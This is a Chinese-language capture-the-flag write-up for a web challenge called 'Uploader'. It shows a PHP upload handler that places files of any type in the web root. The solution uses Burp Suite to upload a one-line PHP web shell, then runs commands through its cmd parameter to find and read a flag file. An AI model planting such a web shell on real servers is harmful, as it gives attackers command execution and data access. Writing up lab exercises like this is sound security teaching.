#Web 

## 題目

**Uploader**
給了一個網址，點開來是一個簡單的上傳頁面：
![[W1-7_web.png|386]]
網頁原始碼：
```php
<?php
    if (!empty($_FILES)) {
		$file = $_FILES['file']['tmp_name'];
		$hash = sha1(file_get_contents($file));
		$extension = pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION);
		$dest = '/var/www/html/upload/' . $hash . "." . $extension;
		
		move_uploaded_file($file,$dest);
		echo "<a href='/upload/$hash.$extension'>/upload/$hash.$extension</a>";
?>
<p><?php echo "Sucessful Uploaded !"; ?></p>
<?php 
    } else { 
?>
<p><?php echo "Please Upload A File !"; ?></p>

<form action="index.php" method="post" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="Upload !">
</form>

<?php 
	} 
?>
```

## 解題
1. 檢查網頁原始碼，發現
   - 沒有限制上傳檔案的類型
   - 上傳的檔案會存放於 `/var/www/html/upload/` 路徑
1. 打開 Burp Suite 協助觀察檔案上傳下載資訊
	1. Burp Suite 選 proxy 頁面 -> open a broswer
	2. Burp Suite 提供的瀏覽器中輸入題目的網址並隨意上傳一個檔案，可以在 http history 看到：
	   ![[W1-7_proxy.png|619]]![[W1-7_req&res.png|572]]
	   可以在下方看到 request 和 response
	3. 在 request 的地方按右鍵 -> send to repeater，可以將 request 複製一份編輯後重新送出
	   ![[W1-7_repeater.png|453]]
2. 修改送出的內容，把 `filename` 改成另一個名字，並加入惡意 php 程式，這邊加入取得 shell 的指令 `system($_GET['cmd']);`
   ```php
   ------WebKitFormBoundary3A8rm1u8Q0tPjDdT
	Content-Disposition: form-data; name="file"; filename="WebShell.php"
	Content-Type: text/plaintext
	
	<?php system($_GET['cmd']); ?>
   ```
1. 按 `send` 送出後可以在旁邊的 `response` 區域 render 出網頁樣貌，找到上傳的 `WebShell.php` 位置 `'/upload/3d0b5634010ed4881c556106c2f6f921877c8081.php'`，並輸入到瀏覽器網址列
   ![[W1-7_maliciousPhp.png|586]]
2. 在網址最後加上 `?cmd=id`
   ![[W1-7_cmd.png|450]]
   可以看到已經成功獲取 shell
3. 查找 flag
	1. `cmd=pwd` -> `/var/www/html/upload`
	2. `cmd=ls ..` -> `index.php upload`
	   `cmd=ls ../..` -> `html`
	   -> 去跟目錄查看 `cmd=ls ../../../..`
	   ![[W1-7_root.png|581]]-> 發現有兩個 flag 相關的檔案
	3. 查看檔案
	   - `cmd=cat ../../../../flag_23fb1b`：空白
	   - `cmd=cat ../../../../flag_n2i3na`：
	     ![[W1-7_flag.png|388]]
4. flag = `CTF{uploader_9e0a323b15ee7de91b20de5e}`